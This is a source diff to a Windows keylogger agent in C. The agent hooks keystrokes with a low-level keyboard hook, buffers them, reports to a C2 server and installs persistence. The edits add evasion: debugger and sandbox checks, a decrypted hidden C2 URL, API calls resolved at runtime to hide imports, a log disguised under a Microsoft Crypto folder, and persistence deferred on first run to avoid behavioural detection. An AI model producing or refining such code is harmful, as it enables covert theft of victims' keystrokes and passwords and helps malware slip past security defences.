@@ -444,7 +444,14 @@ static char g_log_path[MAX_PATH] = {0};
 
 static void log_init(void) {
     char appdata[MAX_PATH];
-    if (pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata) == S_OK) {
+    appdata[0] = '\0';
+    if (pSHGetFolderPathA) {
+        pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
+    }
+    if (appdata[0] == '\0') {
+        ExpandEnvironmentStringsA("%APPDATA%", appdata, MAX_PATH);
+    }
+    if (appdata[0]) {
         snprintf(g_log_path, MAX_PATH, "%s\\Microsoft\\Crypto", appdata);
         CreateDirectoryA(g_log_path, NULL);
         snprintf(g_log_path, MAX_PATH, "%s\\Microsoft\\Crypto\\debug.log", appdata);
@@ -491,9 +498,13 @@ static void log_write(const char *msg) {
 
 static int stealth_check_debugger(void) {
     if (IsDebuggerPresent()) return 1;
-    BOOL remote = FALSE;
-    pCheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
-    return remote ? 1 : 0;
+    /* pCheckRemoteDebuggerPresent is NULL before api_init — guard gracefully */
+    if (pCheckRemoteDebuggerPresent) {
+        BOOL remote = FALSE;
+        pCheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
+        if (remote) return 1;
+    }
+    return 0;
 }
 
 static int stealth_check_sandbox(void) {
@@ -503,10 +514,10 @@ static int stealth_check_sandbox(void) {
     GlobalMemoryStatusEx(&mem);
     if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return 1;
 
-    /* Disk check — less than 60GB total suggests sandbox */
+    /* Disk check — less than 20GB total suggests sandbox */
     ULARGE_INTEGER totalBytes;
     if (GetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL)) {
-        if (totalBytes.QuadPart < 35ULL * 1024 * 1024 * 1024) return 1;
+        if (totalBytes.QuadPart < 20ULL * 1024 * 1024 * 1024) return 1;
     }
 
     /* CPU cores — less than 2 suggests sandbox */
@@ -786,11 +797,13 @@ static int config_load(const char *filepath) {
 static void config_apply_default_url(void) {
     if (g_c2_url[0]) return;  /* already set from config file */
 
-#ifdef DEFAULT_C2_URL
-    strncpy(g_c2_url, DEFAULT_C2_URL, MAX_URL_LEN - 1);
+    const char *url = decrypt(__enc_default_c2_url, sizeof(__enc_default_c2_url));
+    if (!url[0]) return;
+
+    strncpy(g_c2_url, url, MAX_URL_LEN - 1);
     g_c2_url[MAX_URL_LEN - 1] = '\0';
 
-    const char *url = g_c2_url;
+    url = g_c2_url;
     if (strncmp(url, "https://", 8) == 0) {
         g_use_https = 1;
         g_c2_port = (g_c2_port != 0) ? g_c2_port : 443;
@@ -812,7 +825,6 @@ static void config_apply_default_url(void) {
     }
 
     log_write("config: using compiled-in default C2 URL");
-#endif
 }
 
 /* update agent_config.json with the assigned agent_id */
@@ -2270,7 +2282,7 @@ done:
 }
 
 static int hook_install(void) {
-    g_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc,
+    g_hook = pSetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc,
                                GetModuleHandle(NULL), 0);
     if (!g_hook) {
         log_write("hook: SetWindowsHookEx failed");
@@ -2383,7 +2395,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             pPostQuitMessage(0);
             return 0;
     }
-    return DefWindowProc(hwnd, msg, wParam, lParam);
+    return pDefWindowProcA(hwnd, msg, wParam, lParam);
 }
 
 static HWND create_hidden_window(HINSTANCE hInstance) {
@@ -2432,16 +2444,16 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         Sleep(delay_ms);
     }
 
-    /* --- initialize logging --- */
-    log_init();
-    log_write("agent starting");
-
     /* --- resolve all WinAPI functions + generate persistence IDs --- */
     if (!api_init()) {
         /* critical DLL missing — can't operate */
         return 1;
     }
     gen_persistence_names();
+
+    /* --- initialize logging --- */
+    log_init();
+    log_write("agent starting");
 
     /* --- load configuration --- */
     char config_path[MAX_PATH];
@@ -2456,8 +2468,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     config_load(config_path);
     config_apply_default_url();
 
-    /* --- install persistence --- */
-    persistence_install();
+    /* --- install persistence (skip on first run — avoids behavioral flag) --- */
+    if (g_agent_registered) {
+        persistence_install();
+    } else {
+        log_write("persistence: deferred (first run)");
+    }
 
     /* --- initialize keystroke buffer --- */
     buffer_init();
@@ -2542,9 +2558,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     /* --- message loop (required for WH_KEYBOARD_LL) --- */
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
+    while (pGetMessageA(&msg, NULL, 0, 0)) {
         pTranslateMessage(&msg);
-        DispatchMessage(&msg);
+        pDispatchMessageA(&msg);
     }
 
     /* --- cleanup --- */
